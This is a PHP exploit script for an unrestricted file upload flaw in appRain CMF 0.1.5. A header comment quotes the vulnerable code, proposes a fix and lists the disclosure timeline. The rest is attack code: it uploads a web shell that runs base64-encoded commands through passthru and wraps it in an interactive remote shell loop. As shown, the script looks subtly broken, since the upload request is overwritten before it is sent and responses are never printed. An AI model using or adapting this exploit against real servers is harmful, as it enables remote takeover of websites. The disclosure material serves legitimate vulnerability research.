 
/*
    ---------------------------------------------------------------------
    appRain CMF <= 0.1.5 (uploadify.php) Unrestricted File Upload Exploit
    ---------------------------------------------------------------------
     
    author............: Egidio Romano aka EgiX
    mail..............: n0b0d13s[at]gmail[dot]com
    software link.....: http://www.apprain.com/
      
    +-------------------------------------------------------------------------+
    | This proof of concept code was written for educational purpose only.    |
    | Use it at your own risk. Author will be not responsible for any damage. |
    +-------------------------------------------------------------------------+
     
    [-] vulnerable code in /webroot/addons/uploadify/uploadify.php
     
    27.    if (!empty($_FILES)) {
    28.            $tempFile = $_FILES[&#039;Filedata&#039;][&#039;tmp_name&#039;];
    29.            //$targetPath = $_SERVER[&#039;DOCUMENT_ROOT&#039;] . $_REQUEST[&#039;folder&#039;] . &#039;/&#039;;
    30.            $targetFile =  "uploads/" . $_FILES[&#039;Filedata&#039;][&#039;name&#039;];
    31.           
    32.            // $fileTypes  = str_replace(&#039;*.&#039;,&#039;&#039;,$_REQUEST[&#039;fileext&#039;]);
    33.            // $fileTypes  = str_replace(&#039;;&#039;,&#039;|&#039;,$fileTypes);
    34.            // $typesArray = split(&#039;\|&#039;,$fileTypes);
    35.            // $fileParts  = pathinfo($_FILES[&#039;Filedata&#039;][&#039;name&#039;]);
    36.           
    37.            // if (in_array($fileParts[&#039;extension&#039;],$typesArray)) {
    38.                    // Uncomment the following line if you want to make the directory if it doesn&#039;t exist
    39.                    // mkdir(str_replace(&#039;//&#039;,&#039;/&#039;,$targetPath), 0755, true);
    40.                   
    41.                    move_uploaded_file($tempFile,$targetFile);
    42.                    echo str_replace($_SERVER[&#039;DOCUMENT_ROOT&#039;],&#039;&#039;,$targetFile);
    43.            // } else {
    44.            //      echo &#039;Invalid file type.&#039;;
    45.            // }
    46.    }
     
    Restricted access to  this script isn&#039;t properly realized,  so an attacker might  be able to upload
    arbitrary files containing malicious PHP code due to uploaded file extension isn&#039;t properly checked.
     
    [-] Possible bug fix:
     
    include_once(&#039;../../../app.php&#039;);
    App::__Obj(&#039;appRain_Base_Core&#039;)->check_admin_login();
     
    add this lines of code at the beginning of the script
     
    [-] Disclosure timeline:
     
    [19/12/2011] - Vulnerability discovered
    [19/12/2011] - Issue reported to http://www.apprain.com/ticket/1135
    [20/12/2011] - Vendor response and fix suggested
    [16/01/2012] - After four weeks still no fix released
    [19/01/2012] - Public disclosure
     
*/
 
error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);
 
function http_send($host, $packet)
{
    if (!($sock = fsockopen($host, 80)))
        die("\n[-] No response from {$host}:80\n");
  
    fputs($sock, $packet);
    return stream_get_contents($sock);
}
 
print "\n+---------------------------------------------------------------+";
print "\n| appRain CMF <= 0.1.5 Unrestricted File Upload Exploit by EgiX |";
print "\n+---------------------------------------------------------------+\n";
  
if ($argc < 3)
{
    print "\nUsage......: php $argv[0] <host> <path>\n";
    print "\nExample....: php $argv[0] localhost /";
    print "\nExample....: php $argv[0] localhost /apprain-v015/\n";
    die();
}
 
$host = $argv[1];
$path = $argv[2];
 
$payload  = "--o0oOo0o\r\n";
$payload .= "Content-Disposition: form-data; name=\"Filedata\"; filename=\"sh.php\"\r\n\r\n";
$payload .= "<?php error_reporting(0); print(___); passthru(base64_decode(\$_SERVER[HTTP_CMD]));\r\n";
$payload .= "--o0oOo0o--\r\n";
 
$packet  = "POST {$path}addons/uploadify/uploadify.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Content-Type: multipart/form-data; boundary=o0oOo0o\r\n";
$packet .= "Connection: close\r\n\r\n{$payload}";
     
 
$packet  = "GET {$path}addons/uploadify/uploads/sh.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Cmd: %s\r\n";
$packet .= "Connection: close\r\n\r\n";
     
while(1)
{
    print "\napprain-shell# ";
    if (($cmd = trim(fgets(STDIN))) == "exit") break;
    $response = http_send($host, sprintf($packet, base64_encode($cmd)));
}
 
?>



